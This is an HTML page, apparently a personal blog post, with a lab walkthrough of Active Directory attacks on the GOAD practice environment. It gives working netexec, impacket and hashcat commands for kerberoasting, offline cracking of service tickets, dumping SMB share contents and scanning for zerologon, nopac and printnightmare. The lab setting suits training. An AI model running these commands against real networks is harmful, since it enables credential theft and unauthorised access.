@@ -1,1 +1,238 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>GOAD Part 2: Domain Enumeration // Engineer Dancun</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.92.2" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Dancun Manyinsa" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://devopsengineerdan.github.io/css/main.min.d5ed8558bcfb3aab1e3d1790fb902decbac1f989a0d27aa3b2a2320773186707.css" />
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="GOAD Part 2: Domain Enumeration"/>
+<meta name="twitter:description" content="GOAD Part 2: Domain Enumeration  Table of Contents   Introduction Kerberoasting in the north domain Cracking with hashcat Spidering and Dumping Shares Known Vulnerabilities  Introduction  In the previous walkthrough we exploited various misconfigurations and obtained some valid domain user credentials. With valid credentials, we can perform more enumeration using tools like bloodhound and also explore various attacks such as kerberoasting. We will explore kerberoasting and domain enumeration using bloodhound…."/>
+
+    <meta property="og:title" content="GOAD Part 2: Domain Enumeration" />
+<meta property="og:description" content="GOAD Part 2: Domain Enumeration  Table of Contents   Introduction Kerberoasting in the north domain Cracking with hashcat Spidering and Dumping Shares Known Vulnerabilities  Introduction  In the previous walkthrough we exploited various misconfigurations and obtained some valid domain user credentials. With valid credentials, we can perform more enumeration using tools like bloodhound and also explore various attacks such as kerberoasting. We will explore kerberoasting and domain enumeration using bloodhound…." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://devopsengineerdan.github.io/posts/goad_part2/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-11-14T01:29:29+03:00" />
+<meta property="article:modified_time" content="2024-11-14T01:29:29+03:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://devopsengineerdan.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="Dancun Manyinsa" /></a>
+      <h1>Engineer Dancun</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="https://devopsengineerdan.github.io/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="https://devopsengineerdan.github.io/tags/">Tags</a>
+             - 
+          
+          <a class="app-header-menu-item" href="https://devopsengineerdan.github.io/about/">About</a>
+      </nav>
+      <p>Software Engineer, Researcher(AI and Quantum Science), and Habitual Quant</p>
+      <div class="app-header-social">
+        
+          <a href="https://www.github.com/DancunManyinsa" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://www.linkedin.com/in/dancun-manyinsa-42518a17b/" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+  <title>Linkedin</title>
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
+</svg>
+          </a>
+        
+          <a href="mailto:dancunmoruri@gmail.com" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-link">
+  <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
+  <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">GOAD Part 2: Domain Enumeration</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Nov 14, 2024
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          2 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://devopsengineerdan.github.io/tags/cybersecurity/">cybersecurity</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <hr>
+<h1 id="goad-part-2-domain-enumeration">GOAD Part 2: Domain Enumeration</h1>
+<blockquote>
+<h3 id="table-of-contents">Table of Contents</h3>
+</blockquote>
+<ul>
+<li><a href="#introduction">Introduction</a></li>
+<li><a href="#kerberoasting-in-the-north-domain">Kerberoasting in the north domain</a></li>
+<li><a href="#cracking-with-hashcat">Cracking with hashcat</a></li>
+<li><a href="#spidering-and-dumping-shares">Spidering and Dumping Shares</a></li>
+<li><a href="#known-vulnerabilities">Known Vulnerabilities</a></li>
+</ul>
+<h2 id="introduction">Introduction</h2>
+<ul>
+<li>In the previous walkthrough we exploited various misconfigurations and obtained some valid domain user credentials.</li>
+<li>With valid credentials, we can perform more enumeration using tools like bloodhound and also explore various attacks such as kerberoasting. We will explore kerberoasting and domain enumeration using bloodhound…..</li>
+</ul>
+<h2 id="kerberoasting-in-the-north-domain">Kerberoasting in the north domain</h2>
+<p><img src="https://github.com/user-attachments/assets/077ccce7-ed98-4800-aee8-83f15893809a" alt="goad_part2_1"></p>
+<ul>
+<li>With our valid credentials we can try and abuse kerberoasting to obtain more credential material that can grant further access to systems and data.</li>
+<li>Kerberoasting involves attempting to crack passwords of service accounts by exploiting the Kerberos authentication protocol.</li>
+<li>We obtain service tickets associated with these accounts and then perform offline password cracking.</li>
+<li>Using netexec:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s">nxc ldap <span style="color:#ae81ff">192.168.56.11</span> <span style="color:#f92672">-</span>u brandon.stark <span style="color:#f92672">-</span>p <span style="color:#e6db74">&#39;iseedeadpeople&#39;</span> <span style="color:#f92672">-</span>d north.sevenkingdoms.local <span style="color:#f92672">--</span>kerberoasting KERBEROASTING
+</code></pre></div><p><img src="https://github.com/user-attachments/assets/a2ed153d-e430-4a0a-8d7f-d175cfb4e8d2" alt="goad_part2_2"></p>
+<ul>
+<li>Using impacket:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s">impacket<span style="color:#f92672">-</span>GetUserSPNs <span style="color:#f92672">-</span>request <span style="color:#f92672">-</span>dc<span style="color:#f92672">-</span>ip <span style="color:#ae81ff">192.168.56.11</span> north.sevenkingdoms.local<span style="color:#f92672">/</span>brandon.stark<span style="color:#f92672">:</span>iseedeadpeople
+</code></pre></div><p><img src="https://github.com/user-attachments/assets/96e24b3e-2cf0-4fb4-94c9-d85bb627ab97" alt="goad_part2_3"></p>
+<ul>
+<li>We obtain 3 kerberoastable users: sansa.stark, jon.snow and sql_svc</li>
+</ul>
+<h2 id="cracking-with-hashcat">Cracking with hashcat</h2>
+<ul>
+<li>Running hashcat in the following mode with a rockyou password list:</li>
+</ul>
+<p><img src="https://github.com/user-attachments/assets/81ae2678-4415-4a6e-89dd-6159a939f266" alt="goad_part2_4"></p>
+<ul>
+<li>We get the plaintext credentials of the jon.snow user.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s">hashcat <span style="color:#f92672">-</span>m <span style="color:#ae81ff">13100</span> <span style="color:#f92672">-</span>a <span style="color:#ae81ff">0</span> KERBEROASTING <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>share<span style="color:#f92672">/</span>wordlists<span style="color:#f92672">/</span>rockyou.txt.gz
+</code></pre></div><p><img src="https://github.com/user-attachments/assets/8e54345d-7806-4602-9c4b-83f39d705305" alt="goad_part2_5"></p>
+<h2 id="spidering-and-dumping-shares">Spidering and Dumping Shares</h2>
+<p><img src="https://github.com/user-attachments/assets/4f048a00-4ef5-4269-8a60-a1f2b42dc918" alt="goad_part2_6"></p>
+<ul>
+<li>Check for shares and permissions on them.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s"> nxc smb <span style="color:#ae81ff">192.168.56.10-23</span> <span style="color:#f92672">-</span>u jon.snow <span style="color:#f92672">-</span>p iknownothing <span style="color:#f92672">-</span>d north.sevenkingdoms.local <span style="color:#f92672">--</span>shares
+</code></pre></div><p><img src="https://github.com/user-attachments/assets/c90eda41-81f6-48c9-8bdf-7a246ad57a30" alt="goad_part2_7"></p>
+<ul>
+<li>Dump all files from all the readable shares.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s"> nxc smb <span style="color:#ae81ff">192.168.56.10-23</span> <span style="color:#f92672">-</span>u jon.snow <span style="color:#f92672">-</span>p iknownothing <span style="color:#f92672">-</span>d north.sevenkingdoms.local <span style="color:#f92672">-</span>M spider_plus <span style="color:#f92672">-</span>o DOWNLOAD_FLAG<span style="color:#f92672">=</span><span style="color:#66d9ef">TRUE</span>
+</code></pre></div><p><img src="https://github.com/user-attachments/assets/2c32799d-13db-46c7-8617-e4c625ebd0d7" alt="goad_part2_8"></p>
+<ul>
+<li>We have a couple of interesting dumped files.</li>
+</ul>
+<p><img src="https://github.com/user-attachments/assets/e55c97c9-4c47-4d76-b50e-dadc5e46bec1" alt="goad_part2_9"></p>
+<ul>
+<li>We discover credentials to jeor.mormont user.</li>
+</ul>
+<p><img src="https://github.com/user-attachments/assets/e25fc7de-cbcb-49b2-8b50-1653eac34c9b" alt="goad_part2_10"></p>
+<p><img src="https://github.com/user-attachments/assets/0cebbe58-193a-4f53-8f46-7ed839c96eb8" alt="goad_part2_11"></p>
+<h2 id="known-vulnerabilities">Known Vulnerabilities</h2>
+<p><img src="https://github.com/user-attachments/assets/486cbc51-561a-42da-a586-64a25b385c80" alt="goad_part2_12"></p>
+<ul>
+<li>Some of these vulnerabilities require credentials to enumerate so we will use a domain user’s credentials with netexec, to check the various known vulnerabilities.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-s" data-lang="s"> nxc smb <span style="color:#ae81ff">192.168.56.10-23</span> <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#39;jon.snow&#39;</span> <span style="color:#f92672">-</span>p <span style="color:#e6db74">&#39;iknownothing&#39;</span> <span style="color:#f92672">-</span>M zerologon <span style="color:#f92672">-</span>M nopac <span style="color:#f92672">-</span>M printnightmare <span style="color:#f92672">-</span>M smbghost <span style="color:#f92672">-</span>M ms17<span style="color:#ae81ff">-010</span>
+</code></pre></div><ul>
+<li>We are able to identify printnightmare and nopac on winterfell:</li>
+</ul>
+<p><img src="https://github.com/user-attachments/assets/333c11dd-0c8f-484b-9986-11fcbf3bfd93" alt="goad_part2_13"></p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+      <div>
+        <br>
+        <div>
+          <h5 class="title is-small">Share to social media</h5>
+          <div>
+            <a class="share share-network-twitter" style="background-color:#008080;"><i class="fab fah fa-lg fa-twitter"></i><span>Twitter</span></a>
+            <a class="share share-network-facebook" style="background-color:#1877f2;"><i class="fab fah fa-lg fa-facebook-f"></i><span>Facebook</span></a>
+            <a class="share share-network-linkedin" style="background-color:#2B1B17;"><i class="fab fah fa-lg fa-linkedin"></i><span>LinkedIn</span></a>
+            <a class="share share-network-hackernews" style="background-color:#008000"><i class="fab fah fa-lg fa-hacker-news"></i><span>HackerNews</span></a>
+            <a class="share share-network-pinterest" style="background-color:#bd081c;"><i class="fab fah fa-lg fa-pinterest"></i><span>Pinterest</span></a>
+            <a class="share share-network-pocket" style="background-color:#7F38EC;"><i class="fab fah fa-lg fa-get-pocket"></i><span>Pocket</span></a>
+            <a class="share share-network-email" style="background-color:#333333;"><i class="far fah fa-lg fa-envelope"></i><span>Email</span></a>
+            <a class="share share-network-flipboard" style="background-color: #837E7C;"><i class="fab fah fa-lg fa-flipboard"></i><span>Flipboard</span></a>
+            <a class="share share-network-quora" style="background-color:#808000;"><i class="fab fah fa-lg fa-quora"></i><span>Quora</span></a>
+            <a class="share share-network-reddit" style="background-color: #581845
+            ;"><i class="fab fah fa-lg fa-reddit-alien"></i><span>Reddit</span></a>
+            <a class="share share-network-telegram" style="background-color:#000080;"><i class="fab fah fa-lg fa-telegram-plane"></i><span>Telegram</span></a>
+            <a class="share share-network-whatsapp" style="background-color:#E55451;"><i class="fab fah fa-lg fa-whatsapp"></i><span>Whatsapp</span></a>
+            <a class="share share-network-sms" style="background-color:#513B1C;"><i class="far fah fa-lg fa-comment-dots"></i><span>SMS</span></a>
+          </div>
+        </div>
+      </div>
+      <div class="comments">
+        <div id="disqus_thread" pageConfig="[object Object]"></div>
+      </div>
+      
+      <div id="disqus_thread"></div>
+      <script>
+          
+
+          
+
+          (function() { 
+          var d = document, s = d.createElement('script');
+          s.src = 'https://engineer-dancun-personal-blog.disqus.com/embed.js';
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+          })();
+      </script>
+      <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+      
+      <br><br><br>
+      <footer>
+        &copy;  
+        Powered by <a href="https://github.com/gohugoio/hugo" target="_blank">Hugo
+      </footer>
+      <script type="application/ld+json">
+        {
+          "@context" : "http://schema.org",
+          "@type" : "Blog",
+          "name": " Engineer Dancun ",
+          "url" : "https://devopsengineerdan.github.io",
+          "image": "./static/avatar.jpg",
+          "description": "Software Engineer and Researcher"
+        }
+        </script>
+        <script id="dsq-count-scr" src="//engineer-dancun.disqus.com/count.js" async></script>
+    </main>
+  </body>
+</html>
 
